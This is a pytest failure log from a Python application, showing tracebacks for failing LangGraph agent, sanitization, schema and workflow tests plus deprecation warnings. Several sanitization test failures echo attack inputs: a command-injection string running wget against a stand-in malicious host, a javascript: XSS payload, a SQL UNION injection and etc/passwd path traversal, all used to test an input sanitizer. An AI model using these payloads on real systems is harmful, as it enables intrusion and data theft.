_____________________ TestLangGraphAgent.test_chat_success _____________________
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1611: in __enter__
    setattr(self.target, self.attribute, new_attr)
.venv/lib/python3.13/site-packages/pydantic/main.py:990: in __setattr__
    elif (setattr_handler := self._setattr_handler(name, value)) is not None:
.venv/lib/python3.13/site-packages/pydantic/main.py:1037: in _setattr_handler
    raise ValueError(f'"{cls.__name__}" object has no field "{name}"')
E   ValueError: "RunnableBinding" object has no field "ainvoke"

During handling of the above exception, another exception occurred:
.venv/lib/python3.13/site-packages/pydantic/main.py:1077: in __delattr__
    object.__delattr__(self, item)
E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'. Did you mean: 'invoke'?

During handling of the above exception, another exception occurred:
tests/unit/test_langgraph_graph.py:120: in test_chat_success
    with patch.object(agent.llm, 'ainvoke', return_value=mock_llm_response):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1624: in __enter__
    if not self.__exit__(*sys.exc_info()):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1635: in __exit__
    delattr(self.target, self.attribute)
.venv/lib/python3.13/site-packages/pydantic/main.py:1079: in __delattr__
    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')
E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
________________ TestLangGraphAgent.test_chat_with_token_usage _________________
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1611: in __enter__
    setattr(self.target, self.attribute, new_attr)
.venv/lib/python3.13/site-packages/pydantic/main.py:990: in __setattr__
    elif (setattr_handler := self._setattr_handler(name, value)) is not None:
.venv/lib/python3.13/site-packages/pydantic/main.py:1037: in _setattr_handler
    raise ValueError(f'"{cls.__name__}" object has no field "{name}"')
E   ValueError: "RunnableBinding" object has no field "ainvoke"

During handling of the above exception, another exception occurred:
.venv/lib/python3.13/site-packages/pydantic/main.py:1077: in __delattr__
    object.__delattr__(self, item)
E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'. Did you mean: 'invoke'?

During handling of the above exception, another exception occurred:
tests/unit/test_langgraph_graph.py:133: in test_chat_with_token_usage
    with patch.object(agent.llm, 'ainvoke', return_value=mock_llm_response):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1624: in __enter__
    if not self.__exit__(*sys.exc_info()):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1635: in __exit__
    delattr(self.target, self.attribute)
.venv/lib/python3.13/site-packages/pydantic/main.py:1079: in __delattr__
    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')
E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
_________________ TestLangGraphAgent.test_chat_llm_error_retry _________________
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1611: in __enter__
    setattr(self.target, self.attribute, new_attr)
.venv/lib/python3.13/site-packages/pydantic/main.py:990: in __setattr__
    elif (setattr_handler := self._setattr_handler(name, value)) is not None:
.venv/lib/python3.13/site-packages/pydantic/main.py:1037: in _setattr_handler
    raise ValueError(f'"{cls.__name__}" object has no field "{name}"')
E   ValueError: "RunnableBinding" object has no field "ainvoke"

During handling of the above exception, another exception occurred:
.venv/lib/python3.13/site-packages/pydantic/main.py:1077: in __delattr__
    object.__delattr__(self, item)
E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'. Did you mean: 'invoke'?

During handling of the above exception, another exception occurred:
tests/unit/test_langgraph_graph.py:153: in test_chat_llm_error_retry
    with patch.object(agent.llm, 'ainvoke') as mock_invoke:
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1624: in __enter__
    if not self.__exit__(*sys.exc_info()):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1635: in __exit__
    delattr(self.target, self.attribute)
.venv/lib/python3.13/site-packages/pydantic/main.py:1079: in __delattr__
    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')
E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
______________ TestLangGraphAgent.test_chat_max_retries_exceeded _______________
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1611: in __enter__
    setattr(self.target, self.attribute, new_attr)
.venv/lib/python3.13/site-packages/pydantic/main.py:990: in __setattr__
    elif (setattr_handler := self._setattr_handler(name, value)) is not None:
.venv/lib/python3.13/site-packages/pydantic/main.py:1037: in _setattr_handler
    raise ValueError(f'"{cls.__name__}" object has no field "{name}"')
E   ValueError: "RunnableBinding" object has no field "ainvoke"

During handling of the above exception, another exception occurred:
.venv/lib/python3.13/site-packages/pydantic/main.py:1077: in __delattr__
    object.__delattr__(self, item)
E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'. Did you mean: 'invoke'?

During handling of the above exception, another exception occurred:
tests/unit/test_langgraph_graph.py:172: in test_chat_max_retries_exceeded
    with patch.object(agent.llm, 'ainvoke') as mock_invoke:
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1624: in __enter__
    if not self.__exit__(*sys.exc_info()):
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1635: in __exit__
    delattr(self.target, self.attribute)
.venv/lib/python3.13/site-packages/pydantic/main.py:1079: in __delattr__
    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')
E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
_______________ TestLangGraphAgent.test_tool_call_tool_not_found _______________
tests/unit/test_langgraph_graph.py:242: in test_tool_call_tool_not_found
    with pytest.raises(ToolExecutionException):
E   Failed: DID NOT RAISE <class 'app.core.exceptions.ToolExecutionException'>
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:graph.py:299 [2m2025-07-05T14:24:01.878511Z[0m [[31m[1merror    [0m] [1mtool_not_found                [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35m_tool_call[0m [36mlineno[0m=[35m299[0m [36mmodule[0m=[35mgraph[0m [36moperation_id[0m=[35m944f3c7c-e9c9-45e9-988b-ddd0e666bcad[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m [36mtool_name[0m=[35munknown_tool[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:24:01.878657Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m"Tool execution failed for 'unknown_tool': Tool 'unknown_tool' not found"[0m [36merror_type[0m=[35mtool_execution_error[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/tool/unknown_tool[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
ERROR    app.core.logging:graph.py:333 [2m2025-07-05T14:24:01.878729Z[0m [[31m[1merror    [0m] [1mtool_execution_failed         [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m"Tool 'unknown_tool' not found"[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35m_tool_call[0m [36mlineno[0m=[35m333[0m [36mmodule[0m=[35mgraph[0m [36moperation_id[0m=[35m944f3c7c-e9c9-45e9-988b-ddd0e666bcad[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m [36mtool_name[0m=[35munknown_tool[0m
Traceback (most recent call last):
  File "/home/paul/boardroom-repo/app/core/langgraph/graph.py", line 300, in _tool_call
    raise_tool_execution_error(error_msg, tool_name)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^
  File "/home/paul/boardroom-repo/app/core/exceptions.py", line 385, in raise_tool_execution_error
    raise ToolExecutionException(message=message, tool_name=tool_name)
app.core.exceptions.ToolExecutionException: Tool 'unknown_tool' not found
_________________ TestLangGraphAgent.test_create_graph_success _________________
tests/unit/test_langgraph_graph.py:314: in test_create_graph_success
    graph = await agent.create_graph()
app/core/langgraph/graph.py:420: in create_graph
    raise e
app/core/langgraph/graph.py:397: in create_graph
    await checkpointer.setup()
.venv/lib/python3.13/site-packages/langgraph/checkpoint/postgres/aio.py:84: in setup
    async with self._cursor() as cur:
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py:214: in __aenter__
    return await anext(self.gen)
.venv/lib/python3.13/site-packages/langgraph/checkpoint/postgres/aio.py:328: in _cursor
    async with _ainternal.get_connection(self.conn) as conn:
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/contextlib.py:214: in __aenter__
    return await anext(self.gen)
.venv/lib/python3.13/site-packages/langgraph/checkpoint/postgres/_ainternal.py:24: in get_connection
    raise TypeError(f"Invalid connection type: {type(conn)}")
E   TypeError: Invalid connection type: <class 'unittest.mock.AsyncMock'>
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:graph.py:415 [2m2025-07-05T14:24:01.996195Z[0m [[31m[1merror    [0m] [1mgraph_creation_failed         [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m"Invalid connection type: <class 'unittest.mock.AsyncMock'>"[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35mcreate_graph[0m [36mlineno[0m=[35m415[0m [36mmodule[0m=[35mgraph[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m
_____________ TestLangGraphAgent.test_create_graph_no_checkpointer _____________
tests/unit/test_langgraph_graph.py:331: in test_create_graph_no_checkpointer
    graph = await agent.create_graph()
app/core/langgraph/graph.py:420: in create_graph
    raise e
app/core/langgraph/graph.py:402: in create_graph
    raise Exception("Connection pool initialization failed")
E   Exception: Connection pool initialization failed
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:graph.py:415 [2m2025-07-05T14:24:02.048775Z[0m [[31m[1merror    [0m] [1mgraph_creation_failed         [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Connection pool initialization failed'[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35mcreate_graph[0m [36mlineno[0m=[35m415[0m [36mmodule[0m=[35mgraph[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m
_________________ TestLangGraphAgent.test_get_response_success _________________
tests/unit/test_langgraph_graph.py:354: in test_get_response_success
    result = await agent.get_response(messages, session_id)
app/core/langgraph/graph.py:445: in get_response
    CallbackHandler(
E   TypeError: LangchainCallbackHandler.__init__() got an unexpected keyword argument 'environment'
_________________ TestLangGraphAgent.test_get_stream_response __________________
tests/unit/test_langgraph_graph.py:379: in test_get_stream_response
    async for token in agent.get_stream_response(messages, session_id):
app/core/langgraph/graph.py:478: in get_stream_response
    CallbackHandler(
E   TypeError: LangchainCallbackHandler.__init__() got an unexpected keyword argument 'environment'
___________________ TestLangGraphAgent.test_get_chat_history ___________________
tests/unit/test_langgraph_graph.py:405: in test_get_chat_history
    result = await agent.get_chat_history(session_id)
app/core/langgraph/graph.py:512: in get_chat_history
    state: StateSnapshot = await sync_to_async(self._graph.get_state)(
E   TypeError: object Mock can't be used in 'await' expression
__________________ TestLangGraphAgent.test_clear_chat_history __________________
tests/unit/test_langgraph_graph.py:420: in test_clear_chat_history
    await agent.clear_chat_history(session_id)
app/core/langgraph/graph.py:540: in clear_chat_history
    async with conn_pool.connection() as conn:
E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
------------------------------ Captured log call -------------------------------
ERROR    app.core.logging:graph.py:550 [2m2025-07-05T14:24:02.197907Z[0m [[31m[1merror    [0m] [1mFailed to clear chat history  [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m"'coroutine' object does not support the asynchronous context manager protocol"[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35mclear_chat_history[0m [36mlineno[0m=[35m550[0m [36mmodule[0m=[35mgraph[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m
_________ TestCreateMeetingAgendaTool.test_time_allocation_calculation _________
tests/unit/test_meeting_management_tools.py:120: in test_time_allocation_calculation
    assert total_time == 30
E   assert 27.0 == 30
_____________ TestSanitizeString.test_sanitize_string_html_escape ______________
tests/unit/test_sanitization.py:39: in test_sanitize_string_html_escape
    assert "&lt;script&gt;" in result
E   AssertionError: assert '&lt;script&gt;' in ''
__________ TestSanitizeString.test_sanitize_string_remove_null_bytes ___________
tests/unit/test_sanitization.py:53: in test_sanitize_string_remove_null_bytes
    assert result == "Hello World"
E   AssertionError: assert 'HelloWorld' == 'Hello World'
E     
E     - Hello World
E     ?      -
E     + HelloWorld
_____________ TestSanitizeEmail.test_sanitize_email_invalid_format _____________
tests/unit/test_sanitization.py:101: in test_sanitize_email_invalid_format
    with pytest.raises(ValueError, match="Invalid email format"):
E   Failed: DID NOT RAISE <class 'ValueError'>
__________________ TestSanitizeDict.test_sanitize_dict_nested __________________
tests/unit/test_sanitization.py:139: in test_sanitize_dict_nested
    assert "&lt;script&gt;" in result["user"]["name"]
E   AssertionError: assert '&lt;script&gt;' in ''
________________ TestSanitizeList.test_sanitize_list_with_html _________________
tests/unit/test_sanitization.py:170: in test_sanitize_list_with_html
    assert "&lt;script&gt;" in result[0]
E   AssertionError: assert '&lt;script&gt;' in ''
__________ TestSanitizeFilename.test_sanitize_filename_path_traversal __________
tests/unit/test_sanitization.py:247: in test_sanitize_filename_path_traversal
    assert result == "etcpasswd"
E   AssertionError: assert '......etcpasswd' == 'etcpasswd'
E     
E     - etcpasswd
E     + ......etcpasswd
E     ? ++++++
_______ TestSanitizeSqlLikePattern.test_sanitize_sql_like_pattern_normal _______
tests/unit/test_sanitization.py:271: in test_sanitize_sql_like_pattern_normal
    assert result == "search_term"
E   AssertionError: assert 'search\\_term' == 'search_term'
E     
E     - search_term
E     + search\_term
E     ?       +
_____________ TestSanitizeJsonData.test_sanitize_json_data_simple ______________
tests/unit/test_sanitization.py:325: in test_sanitize_json_data_simple
    assert "&lt;script&gt;" in result["message"]
E   AssertionError: assert '&lt;script&gt;' in ''
_____________ TestSanitizeUrl.test_sanitize_url_dangerous_schemes ______________
tests/unit/test_sanitization.py:443: in test_sanitize_url_dangerous_schemes
    sanitize_url(url)
app/utils/sanitization.py:277: in sanitize_url
    raise ValueError(f"URL scheme must be one of: {', '.join(allowed_schemes)}")
E   ValueError: URL scheme must be one of: http, https, ftp, ftps

During handling of the above exception, another exception occurred:
tests/unit/test_sanitization.py:442: in test_sanitize_url_dangerous_schemes
    with pytest.raises(ValueError, match="dangerous protocol"):
E   AssertionError: Regex pattern did not match.
E    Regex: 'dangerous protocol'
E    Input: 'URL scheme must be one of: http, https, ftp, ftps'
_________________ TestSanitizeUrl.test_sanitize_url_malformed __________________
tests/unit/test_sanitization.py:453: in test_sanitize_url_malformed
    sanitize_url("not a url")
app/utils/sanitization.py:277: in sanitize_url
    raise ValueError(f"URL scheme must be one of: {', '.join(allowed_schemes)}")
E   ValueError: URL scheme must be one of: http, https, ftp, ftps

During handling of the above exception, another exception occurred:
tests/unit/test_sanitization.py:452: in test_sanitize_url_malformed
    with pytest.raises(ValueError, match="Invalid URL format"):
E   AssertionError: Regex pattern did not match.
E    Regex: 'Invalid URL format'
E    Input: 'URL scheme must be one of: http, https, ftp, ftps'
_________ TestSanitizationIntegration.test_comprehensive_sanitization __________
tests/unit/test_sanitization.py:540: in test_comprehensive_sanitization
    assert "&lt;script&gt;" in result["user"]["name"]
E   AssertionError: assert '&lt;script&gt;' in ''
_____ TestSanitizationEdgeCases.test_sanitize_string_advanced_xss_attempts _____
tests/unit/test_sanitization.py:580: in test_sanitize_string_advanced_xss_attempts
    assert "javascript:" not in result.lower()
E   AssertionError: assert 'javascript:' not in 'javascript:...7;xss&#x27;)'
E     
E     'javascript:' is contained here:
E       javascript:alert(&#x27;xss&#x27;)
E     ? +++++++++++
____ TestSanitizationEdgeCases.test_sanitize_string_sql_injection_attempts _____
tests/unit/test_sanitization.py:599: in test_sanitize_string_sql_injection_attempts
    assert "'" in result or "&#x27;" in result
E   assert ("'" in 'UNION SELECT password FROM users' or '&#x27;' in 'UNION SELECT password FROM users')
__ TestSanitizationEdgeCases.test_sanitize_string_command_injection_attempts ___
tests/unit/test_sanitization.py:618: in test_sanitize_string_command_injection_attempts
    assert "&lt;" in result or "&gt;" in result or result == payload
E   AssertionError: assert ('&lt;' in '&amp;&amp; wget malicious.com/script.sh' or '&gt;' in '&amp;&amp; wget malicious.com/script.sh' or '&amp;&amp; w...com/script.sh' == '&& wget mali...com/script.sh'
E     
E     - && wget malicious.com/script.sh
E     + &amp;&amp; wget malicious.com/script.sh
E     ?  ++++ ++++)
____ TestSanitizationEdgeCases.test_sanitize_string_unicode_bypass_attempts ____
tests/unit/test_sanitization.py:634: in test_sanitize_string_unicode_bypass_attempts
    assert "&lt;" in result
E   AssertionError: assert '&lt;' in ''
_____ TestSanitizationEdgeCases.test_sanitize_string_empty_and_whitespace ______
tests/unit/test_sanitization.py:670: in test_sanitize_string_empty_and_whitespace
    assert result == html.escape(input_str)
E   NameError: name 'html' is not defined. Did you forget to import 'html'?
_______ TestSanitizationEdgeCases.test_sanitize_dict_deep_nesting_attack _______
tests/unit/test_sanitization.py:717: in test_sanitize_dict_deep_nesting_attack
    assert "&lt;script&gt;" in current_result["malicious"]
E   KeyError: 'malicious'
________ TestSanitizationEdgeCases.test_sanitize_list_large_list_attack ________
tests/unit/test_sanitization.py:728: in test_sanitize_list_large_list_attack
    assert "&lt;script&gt;" in item
E   AssertionError: assert '&lt;script&gt;' in ''
___ TestSanitizationEdgeCases.test_sanitize_filename_path_traversal_variants ___
tests/unit/test_sanitization.py:746: in test_sanitize_filename_path_traversal_variants
    assert ".." not in result
E   AssertionError: assert '..' not in '......etcpasswd'
E     
E     '..' is contained here:
E       ......etcpasswd
E     ? ++
___ TestSanitizationEdgeCases.test_validate_password_strength_comprehensive ____
tests/unit/test_sanitization.py:793: in test_validate_password_strength_comprehensive
    assert validate_password_strength(password) is True
app/utils/sanitization.py:115: in validate_password_strength
    raise ValueError("Password must be at least 8 characters long")
E   ValueError: Password must be at least 8 characters long
____ TestSanitizationEdgeCases.test_validate_uuid_string_format_variations _____
tests/unit/test_sanitization.py:828: in test_validate_uuid_string_format_variations
    with pytest.raises(ValueError):
E   Failed: DID NOT RAISE <class 'ValueError'>
_______ TestSanitizationEdgeCases.test_sanitize_json_data_attack_vectors _______
tests/unit/test_sanitization.py:856: in test_sanitize_json_data_attack_vectors
    assert "&lt;script&gt;" in result["xss_attempt"]
E   AssertionError: assert '&lt;script&gt;' in ''
______ TestSanitizationEdgeCases.test_sanitize_url_comprehensive_attacks _______
tests/unit/test_sanitization.py:899: in test_sanitize_url_comprehensive_attacks
    sanitize_url(url)
app/utils/sanitization.py:277: in sanitize_url
    raise ValueError(f"URL scheme must be one of: {', '.join(allowed_schemes)}")
E   ValueError: URL scheme must be one of: http, https, ftp, ftps

During handling of the above exception, another exception occurred:
tests/unit/test_sanitization.py:898: in test_sanitize_url_comprehensive_attacks
    with pytest.raises(ValueError, match="dangerous protocol|Invalid URL format"):
E   AssertionError: Regex pattern did not match.
E    Regex: 'dangerous protocol|Invalid URL format'
E    Input: 'URL scheme must be one of: http, https, ftp, ftps'
___ TestSanitizationEdgeCases.test_sanitization_performance_with_large_data ____
tests/unit/test_sanitization.py:958: in test_sanitization_performance_with_large_data
    assert "&lt;script&gt;" in sanitized_string
E   AssertionError: assert '&lt;script&gt;' in ''
__ TestSanitizationSecurityBoundaries.test_sanitization_encoding_preservation __
tests/unit/test_sanitization.py:1044: in test_sanitization_encoding_preservation
    assert "世界" in result
E   AssertionError: assert '世界' in 'Hello  🚀'
______________ TestRotationPolicy.test_rotation_policy_edge_cases ______________
tests/unit/test_security_schemas.py:113: in test_rotation_policy_edge_cases
    policy = RotationPolicy(interval_days=1, warning_days=1, max_age_days=1)
E   pydantic_core._pydantic_core.ValidationError: 1 validation error for RotationPolicy
E   warning_days
E     Value error, warning_days must be less than interval_days [type=value_error, input_value=1, input_type=int]
E       For further information visit https://errors.pydantic.dev/2.11/v/value_error
_______________ TestWorkflowModule.test_workflow_initialization ________________
../.local/share/uv/python/cpython-3.13.5-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:958: in assert_called_once
    raise AssertionError(msg)
E   AssertionError: Expected 'create_boardroom_workflow' to have been called once. Called 0 times.

During handling of the above exception, another exception occurred:
tests/unit/test_workflow.py:426: in test_workflow_initialization
    mock_create_workflow.assert_called_once()
E   AssertionError: Expected 'create_boardroom_workflow' to have been called once. Called 0 times.
=============================== warnings summary ===============================
.venv/lib/python3.13/site-packages/pydantic/v1/typing.py:68
.venv/lib/python3.13/site-packages/pydantic/v1/typing.py:68
.venv/lib/python3.13/site-packages/pydantic/v1/typing.py:68
.venv/lib/python3.13/site-packages/pydantic/v1/typing.py:68
.venv/lib/python3.13/site-packages/pydantic/v1/typing.py:68
.venv/lib/python3.13/site-packages/pydantic/v1/typing.py:68
.venv/lib/python3.13/site-packages/pydantic/v1/typing.py:68
  /home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/pydantic/v1/typing.py:68: DeprecationWarning: Failing to pass a value to the 'type_params' parameter of 'typing.ForwardRef._evaluate' is deprecated, as it leads to incorrect behaviour when calling typing.ForwardRef._evaluate on a stringified annotation that references a PEP 695 type parameter. It will be disallowed in Python 3.15.
    return cast(Any, type_)._evaluate(globalns, localns, recursive_guard=set())

.venv/lib/python3.13/site-packages/pydantic/_internal/_config.py:323
.venv/lib/python3.13/site-packages/pydantic/_internal/_config.py:323
.venv/lib/python3.13/site-packages/pydantic/_internal/_config.py:323
.venv/lib/python3.13/site-packages/pydantic/_internal/_config.py:323
.venv/lib/python3.13/site-packages/pydantic/_internal/_config.py:323
.venv/lib/python3.13/site-packages/pydantic/_internal/_config.py:323
.venv/lib/python3.13/site-packages/pydantic/_internal/_config.py:323
  /home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/pydantic/_internal/_config.py:323: PydanticDeprecatedSince20: Support for class-based `config` is deprecated, use ConfigDict instead. Deprecated in Pydantic V2.0 to be removed in V3.0. See Pydantic V2 Migration Guide at https://errors.pydantic.dev/2.11/migration/
    warnings.warn(DEPRECATION_MESSAGE, DeprecationWarning)

app/core/health_checks.py:192
  /home/paul/boardroom-repo/app/core/health_checks.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    self.startup_time = datetime.utcnow()

app/schemas/security.py:45
  /home/paul/boardroom-repo/app/schemas/security.py:45: PydanticDeprecatedSince20: Pydantic V1 style `@validator` validators are deprecated. You should migrate to Pydantic V2 style `@field_validator` validators, see the migration guide for more details. Deprecated in Pydantic V2.0 to be removed in V3.0. See Pydantic V2 Migration Guide at https://errors.pydantic.dev/2.11/migration/
    @validator('warning_days')

.venv/lib/python3.13/site-packages/pydantic/main.py:243: 8 warnings
tests/unit/test_security_schemas.py: 56 warnings
  /home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/pydantic/main.py:243: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    validated_self = self.__pydantic_validator__.validate_python(data, self_instance=self)

tests/integration/test_api_standards.py::TestAPIStandards::test_detailed_health_endpoint
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_tool_not_found
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_execution_error
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_state_creation_error
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_execution_error
tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_network_error_handling
tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_timeout_error_handling
tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_validation_error_handling
tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_generic_exception_handling
  /home/paul/boardroom-repo/.venv/lib/python3.13/site-packages/structlog/_base.py:173: UserWarning: Remove `format_exc_info` from your processor chain if you want pretty exceptions.
    event_dict = proc(self._logger, method_name, event_dict)

tests/integration/test_health_checks.py: 10 warnings
  /home/paul/boardroom-repo/app/core/health_checks.py:84: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.utcnow()

tests/integration/test_health_checks.py::TestHealthCheckService::test_database_health_check
tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching
tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching
  /home/paul/boardroom-repo/app/core/health_checks.py:265: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    timestamp=datetime.utcnow(),

tests/integration/test_health_checks.py::TestHealthCheckService::test_database_health_check
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_success
tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching
tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching
  /home/paul/boardroom-repo/app/core/health_checks.py:101: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    self.state.last_success_time = datetime.utcnow()

tests/integration/test_health_checks.py::TestHealthCheckService::test_redis_health_check
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_failure_threshold
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_failure_threshold
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_blocks_when_open
  /home/paul/boardroom-repo/app/core/health_checks.py:116: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    self.state.last_failure_time = datetime.utcnow()

tests/integration/test_health_checks.py::TestHealthCheckService::test_redis_health_check
  /home/paul/boardroom-repo/app/core/health_checks.py:222: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    timestamp=datetime.utcnow(),

tests/integration/test_health_checks.py::TestHealthCheckService::test_system_resources_health_check
tests/integration/test_health_checks.py::TestHealthCheckService::test_comprehensive_health_check
  /home/paul/boardroom-repo/app/core/health_checks.py:369: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    "uptime_seconds": (datetime.utcnow() - self.startup_time).total_seconds()

tests/integration/test_health_checks.py::TestHealthCheckService::test_system_resources_health_check
tests/integration/test_health_checks.py::TestHealthCheckService::test_comprehensive_health_check
  /home/paul/boardroom-repo/app/core/health_checks.py:384: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    timestamp=datetime.utcnow(),

tests/integration/test_health_checks.py::TestHealthCheckService::test_comprehensive_health_check
tests/integration/test_health_checks.py::TestHealthCheckService::test_comprehensive_health_check
tests/integration/test_health_checks.py::TestHealthCheckService::test_is_ready
tests/integration/test_health_checks.py::TestHealthCheckService::test_is_ready
tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching
tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching
  /home/paul/boardroom-repo/app/core/health_checks.py:233: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    age = (datetime.utcnow() - result.timestamp).total_seconds()

tests/integration/test_health_checks.py::TestHealthCheckService::test_comprehensive_health_check
  /home/paul/boardroom-repo/app/core/health_checks.py:453: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    "timestamp": datetime.utcnow().isoformat(),

tests/integration/test_health_checks.py::TestHealthCheckService::test_comprehensive_health_check
  /home/paul/boardroom-repo/app/core/health_checks.py:455: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    "uptime_seconds": (datetime.utcnow() - self.startup_time).total_seconds(),

tests/integration/test_health_checks.py::TestHealthCheckService::test_is_alive
